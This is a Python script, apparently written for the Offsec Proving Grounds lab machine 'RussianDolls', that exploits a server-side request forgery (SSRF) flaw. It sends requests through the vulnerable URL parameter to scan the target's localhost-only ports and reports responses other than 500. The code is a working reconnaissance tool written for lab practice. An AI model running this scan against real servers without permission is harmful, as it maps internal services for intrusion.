#!/usr/bin/python3
# SSRF URL fuzzer written for Offsec Proving Grounds machine "RussianDolls"
# NOTE: The server first appears to be vulnerable to RFI but I couldn't seem to
# take advantage of that. Because of the way the url is accessing local resources
# I decided to scan for ports only open on the local machine to see if we could
# take advantage that way. Doing all 65535 port is VERY slow but you can just 
# change loop iteration if you would like using optional start and end port args. 
#
# Written by Rob Flemen
# Author Github: https://github.com/rflemen
# Author YouTube: https://www.youtube.com/@RobFlemen 
# 12/31/2025

import requests
import argparse
import time
from collections import Counter

# Set up arguments
parser = argparse.ArgumentParser(description="Fuzzes a base SSRF URL for non-500 responses.")
parser.add_argument("--url", required=True, help="Base SSRF URL (e.g., http://target/image?image=http://localhost)")
parser.add_argument("--start-port", type=int, default=1, help="Start of port range (default: 1)")
parser.add_argument("--end-port", type=int, default=10000, help="End of port range (default: 10000)")
parser.add_argument("--timeout", type=float, default=2.0, help="Request timeout in seconds (default: 2)")
args = parser.parse_args()

### BANNER ###
print("SCRiPT By:                 ")
print("        ,------.           ")            
print(",--,--, |  .--. ',--,--,--.") 
print("|      ;|  '--' ||        |") 
print("|  ||  ||  | --' |  |  |  |") 
print("`--''--'`--'     `--`--`--'")                            
print("URL Fuzzer for SSRF - PG Machine: RussianDolls") 
print(f"Target URL base: {args.url}")
print(f"Scanning ports from {args.start_port} to {args.end_port}")
print("Starting scan...\n")
time.sleep(1)

### SCAN ###
start_time = time.time()
open_count = 0
status_counts = Counter()

for port in range(args.start_port, args.end_port + 1):
    target_url = f"{args.url}:{port}"
    try:
        response = requests.get(target_url, timeout=args.timeout)
        code = response.status_code
        status_counts[code] += 1

        if code != 500:
            open_count += 1
            print(f"[\033[92m✓\033[00m] Port {port} -> Status: \033[92m{code}\033[00m")
    except requests.exceptions.Timeout:
        status_counts["timeout"] += 1
    except requests.exceptions.RequestException:
        status_counts["error"] += 1

end_time = time.time()
duration = end_time - start_time

### SUMMARY ###
print("\nScan complete!")
print(f"Ports tested: {args.end_port - args.start_port + 1}")
print(f"Non-500 responses (likely interesting): \033[92m{open_count}\033[00m")
print(f"Total scan time: \033[93m{duration:.2f}\033[00m seconds\n")

print("Response code summary:")
for code, count in status_counts.items():
    print(f"  {code}: \033[92m{count}\033[00m responses")
